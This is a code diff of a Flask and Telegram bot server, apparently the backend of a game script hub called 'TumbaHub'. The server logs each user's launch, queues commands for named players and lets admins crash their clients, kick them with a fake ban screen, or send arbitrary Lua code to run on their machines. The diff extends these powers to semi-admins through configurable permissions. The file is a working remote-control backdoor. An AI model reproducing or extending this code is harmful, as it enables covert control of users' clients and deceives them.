@@ -1,7 +1,7 @@
 from flask import Flask, request, jsonify
 import requests
 import json
-import base64 # Обязательно добавляем для работы с GitHub
+import base64
 import time
 import os
 
@@ -10,21 +10,21 @@ app = Flask(__name__)
 # Telegram Bot Token
 TELEGRAM_TOKEN = os.getenv('TELEGRAM_TOKEN')
 
-
-# Задаем свой ID как дефолтный, если сервер не найдет переменную
-FULL_ADMINS_STR = os.getenv('FULL_ADMINS')
-# Для полу-админов дефолт - пустая строка
-SEMI_ADMINS_STR = os.getenv('SEMI_ADMINS')
+# --- СИСТЕМА АДМИНОВ И РОЛЕЙ ---
+FULL_ADMINS_STR = os.getenv('FULL_ADMINS', '')
+SEMI_ADMINS_STR = os.getenv('SEMI_ADMINS', '')
 
 FULL_ADMINS = [int(admin_id.strip()) for admin_id in FULL_ADMINS_STR.split(',') if admin_id.strip()]
 SEMI_ADMINS = [int(admin_id.strip()) for admin_id in SEMI_ADMINS_STR.split(',') if admin_id.strip()]
 
-# The main chat where notifications about new players are sent.
-# Assumes the first full admin is the target for these notifications.
 TELEGRAM_CHAT_ID = FULL_ADMINS[0] if FULL_ADMINS else None
 
+# === УДОБНАЯ НАСТРОЙКА ПРАВ ДЛЯ SEMI_ADMINS ===
+# Доступные права: message, freeze, unfreeze, kick, defaultkick, fakeban, reset, execselect, crash
+SEMI_PERMS_STR = os.getenv('SEMI_PERMS', 'message,freeze,unfreeze,kick,defaultkick,fakeban,reset')
+SEMI_PERMS = [p.strip() for p in SEMI_PERMS_STR.split(',') if p.strip()]
+
 # --- НАСТРОЙКИ GITHUB DB ---
-# ВНИМАНИЕ: Вставь сюда НОВЫЙ токен от GitHub!
 GITHUB_TOKEN = os.getenv('GITHUB_TOKEN')
 REPO_OWNER = 'repositorykreml1n'
 REPO_NAME = 'commands'
@@ -41,7 +41,6 @@ def load_players_from_github():
             content_b64 = response.json()['content']
             content_str = base64.b64decode(content_b64).decode('utf-8')
             saved_players = json.loads(content_str)
-            # Восстанавливаем словарь
             return {player: [] for player in saved_players}
         except Exception as e:
             print("Ошибка чтения базы:", e)
@@ -52,18 +51,15 @@ def save_players_to_github():
     url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{FILE_PATH}"
     headers = {"Authorization": f"token {GITHUB_TOKEN}", "Accept": "application/vnd.github.v3+json"}
     
-    # 1. Получаем SHA текущего файла, чтобы GitHub разрешил перезапись
     sha = None
     response = requests.get(url, headers=headers)
     if response.status_code == 200:
         sha = response.json()['sha']
         
-    # 2. Берем только список ников
     players_list = list(commands_queue.keys())
     content_str = json.dumps(players_list, indent=4)
     content_b64 = base64.b64encode(content_str.encode('utf-8')).decode('utf-8')
     
-    # 3. Делаем коммит
     data = {
         "message": "Авто-сохранение базы TumbaHub",
         "content": content_b64
@@ -95,7 +91,6 @@ def answer_callback(callback_id, text=None, show_alert=False):
     except Exception as e:
         print(f"Ошибка ответа на callback: {e}")
 
-# Загружаем базу при старте сервера!
 commands_queue = load_players_from_github()
 awaiting_reason = {}
 awaiting_msg_text = {}
@@ -114,9 +109,7 @@ def send_message_from_client():
         return jsonify({"status": "error", "message": "No text provided"}), 400
     
     client_message = data.get('text')
-    # Просто пересылаем текст в основной чат
     send_telegram_message(TELEGRAM_CHAT_ID, f"🤖 **Сообщение от клиента:**\n\n{client_message}", parse_mode="Markdown")
-    
     return jsonify({"status": "success"})
 
 @app.route('/api/log_user', methods=['POST'])
@@ -128,18 +121,14 @@ def log_user():
     username = data.get('username', 'Unknown')
     user_id = data.get('userId', 'Unknown')
     
-    # Если это новый игрок
     if username not in commands_queue:
         commands_queue[username] = []
-        # Сохраняем в GitHub!
         save_players_to_github()
         
     last_seen[username] = time.time()
 
     msg = f"🟢 [V2] НОВЫЙ ЗАПУСК!\n👤 Ник: {username}\n🆔 ID: {user_id}"
     
-    # === СОЗДАЕМ КНОПКИ ДЛЯ УПРАВЛЕНИЯ ===
-    # В callback_data зашиваем действие и ник, например "kick_Player1"
     keyboard = {
         "inline_keyboard": [
             [
@@ -148,9 +137,7 @@ def log_user():
             ]
         ]
     }
-
     send_telegram_message(TELEGRAM_CHAT_ID, msg, reply_markup=keyboard)
-
     return jsonify({"status": "success"})
 
 @app.route('/api/ping', methods=['GET'])
@@ -163,13 +150,10 @@ def ping():
 @app.route('/api/get_command', methods=['GET'])
 def get_command():
     username = request.args.get('username')
-
     if username in commands_queue and len(commands_queue[username]) > 0:
-        cmd = commands_queue[username].pop(0) # Теперь мы достаем просто строку
+        cmd = commands_queue[username].pop(0)
         return jsonify({"status": "success", "command": cmd})
-
     return jsonify({"status": "empty"})
-
 
 @app.route('/api/telegram_webhook', methods=['POST'])
 def telegram_webhook():
@@ -201,13 +185,11 @@ def telegram_webhook():
         data = callback["data"]
         callback_id = callback["id"]
 
-        # 2. Main Menu Navigation
         if data == "menu_games":
             answer_callback(callback_id, "Раздел Игры пока пуст!", show_alert=True)
             return jsonify({"status": "ok"})
             
         elif data == "menu_players":
-            # 3. Player List
             if not commands_queue:
                 send_telegram_message(chat_id, "⚠️ В базе пока нет игроков.")
             else:
@@ -229,30 +211,45 @@ def telegram_webhook():
             answer_callback(callback_id)
             return jsonify({"status": "ok"})
 
-        # --- Player-specific actions ---
         parts = data.split('_', 1)
         if len(parts) == 2:
             btn_action, target_user = parts
             
-            # 4. Player Profile
+            # --- 🛡️ УНИВЕРСАЛЬНАЯ ПРОВЕРКА ПРАВ НА ДЕЙСТВИЯ ---
+            protected_actions = ["freeze", "unfreeze", "reset", "crash", "execselect", "message", "kick", "defaultkick", "fakeban"]
+            if btn_action in protected_actions:
+                if not is_full_admin and btn_action not in SEMI_PERMS:
+                    answer_callback(callback_id, "⛔ У вас нет прав на это действие!", show_alert=True)
+                    return jsonify({"status": "permission_denied"})
+            
+            # 4. ДИНАМИЧЕСКОЕ ПОСТРОЕНИЕ ПРОФИЛЯ
             if btn_action == "playerprof":
-                # Clear awaiting states for this admin
                 awaiting_reason.pop(user_id, None)
                 awaiting_execute.pop(user_id, None)
                 awaiting_msg_text.pop(user_id, None)
                 awaiting_msg_duration.pop(user_id, None)
 
-                # Base keyboard for all admins
-                keyboard_layout = [
-                    [{"text": "💬 Message", "callback_data": f"message_{target_user}"}],
-                    [{"text": "🧊 Freeze", "callback_data": f"freeze_{target_user}"}, {"text": "🏃 Unfreeze", "callback_data": f"unfreeze_{target_user}"}],
-                    [{"text": "🥾 Kick", "callback_data": f"kick_{target_user}"}, {"text": "💀 Reset", "callback_data": f"reset_{target_user}"}],
-                ]
+                def can_use(action):
+                    return is_full_admin or action in SEMI_PERMS
+
+                keyboard_layout = []
                 
-                # Add full admin buttons
-                if is_full_admin:
-                    keyboard_layout.insert(1, [{"text": "⚡ Execute Custom Script", "callback_data": f"execselect_{target_user}"}])
-                    keyboard_layout[3].append({"text": "💥 Crash", "callback_data": f"crash_{target_user}"})
+                if can_use("message"):
+                    keyboard_layout.append([{"text": "💬 Message", "callback_data": f"message_{target_user}"}])
+                    
+                if can_use("execselect"):
+                    keyboard_layout.append([{"text": "⚡ Execute Custom Script", "callback_data": f"execselect_{target_user}"}])
+
+                row2 = []
+                if can_use("freeze"): row2.append({"text": "🧊 Freeze", "callback_data": f"freeze_{target_user}"})
+                if can_use("unfreeze"): row2.append({"text": "🏃 Unfreeze", "callback_data": f"unfreeze_{target_user}"})
+                if row2: keyboard_layout.append(row2)
+
+                row3 = []
+                if can_use("kick"): row3.append({"text": "🥾 Kick", "callback_data": f"kick_{target_user}"})
+                if can_use("reset"): row3.append({"text": "💀 Reset", "callback_data": f"reset_{target_user}"})
+                if can_use("crash"): row3.append({"text": "💥 Crash", "callback_data": f"crash_{target_user}"})
+                if row3: keyboard_layout.append(row3)
 
                 keyboard_layout.append([{"text": "🔙 Назад", "callback_data": "menu_players"}])
                 
@@ -265,27 +262,15 @@ def telegram_webhook():
                 )
 
             # 5. Action Button Handling
-            elif btn_action in ["freeze", "unfreeze", "reset"]:
+            elif btn_action in ["freeze", "unfreeze", "reset", "crash"]:
                 action = f"/{btn_action}"
                 if target_user not in commands_queue: commands_queue[target_user] = []
                 commands_queue[target_user].append(action)
-                answer_callback(callback_id, f"✅ Команда {action} отправлена {target_user}")
-
-            elif btn_action == "crash":
-                if not is_full_admin:
-                    answer_callback(callback_id, "⛔ Недостаточно прав!", show_alert=True)
-                    return jsonify({"status": "permission_denied"})
                 
-                action = "/crash"
-                if target_user not in commands_queue: commands_queue[target_user] = []
-                commands_queue[target_user].append(action)
-                answer_callback(callback_id, f"💥 Краш отправлен {target_user}")
+                alert_text = f"💥 Краш отправлен {target_user}" if btn_action == "crash" else f"✅ Команда {action} отправлена {target_user}"
+                answer_callback(callback_id, alert_text)
 
             elif btn_action == "execselect":
-                if not is_full_admin:
-                    answer_callback(callback_id, "⛔ Недостаточно прав!", show_alert=True)
-                    return jsonify({"status": "permission_denied"})
-                
                 awaiting_execute[user_id] = target_user
                 send_telegram_message(chat_id, f"✍️ Отправь мне Lua-код для выполнения на клиенте **{target_user}**:", parse_mode="Markdown")
             
@@ -293,15 +278,19 @@ def telegram_webhook():
                 awaiting_msg_text[user_id] = target_user
                 send_telegram_message(chat_id, f"✍️ Отправь мне текст сообщения для игрока **{target_user}**:", parse_mode="Markdown")
 
-            # 6. Kick Handling
+            # 6. Kick Handling (Тоже динамическое!)
             elif btn_action == "kick":
                 awaiting_reason[user_id] = target_user
-                keyboard = {
-                    "inline_keyboard": [
-                        [{"text": "Дефолт: Вы были кикнуты", "callback_data": f"defaultkick_{target_user}"}],
-                        [{"text": "⛔ Fake Ban (Error 600)", "callback_data": f"fakeban_{target_user}"}]
-                    ]
-                }
+                
+                def can_use(action): return is_full_admin or action in SEMI_PERMS
+                
+                kick_btns = []
+                if can_use("defaultkick"):
+                    kick_btns.append([{"text": "Дефолт: Вы были кикнуты", "callback_data": f"defaultkick_{target_user}"}])
+                if can_use("fakeban"):
+                    kick_btns.append([{"text": "⛔ Fake Ban (Error 600)", "callback_data": f"fakeban_{target_user}"}])
+                
+                keyboard = {"inline_keyboard": kick_btns}
                 send_telegram_message(chat_id, f"Напиши причину кика для {target_user} или выбери шаблон:", reply_markup=keyboard)
 
             elif btn_action == "defaultkick":
@@ -319,14 +308,12 @@ def telegram_webhook():
                 commands_queue[target_user].append(action)
                 answer_callback(callback_id, f"✅ {target_user} отлетел с экраном Fake Ban (Error 600)!", show_alert=True)
                 
-            # Always answer the callback to remove the loading icon
             answer_callback(callback_id)
 
     # --- Text Message Handling ---
     elif "message" in update and "text" in update["message"]:
         text = update["message"]["text"]
 
-        # 2. Main Menu Command
         if text == "/menu":
             keyboard = {
                 "inline_keyboard": [
@@ -336,7 +323,6 @@ def telegram_webhook():
             }
             send_telegram_message(chat_id, "🎛 **Главное меню TumbaHub**\nВыберите раздел:", reply_markup=keyboard, parse_mode="Markdown")
         
-        # Awaiting states
         elif user_id in awaiting_reason:
             target_user = awaiting_reason.pop(user_id)
             action = f"/kick_{text}"
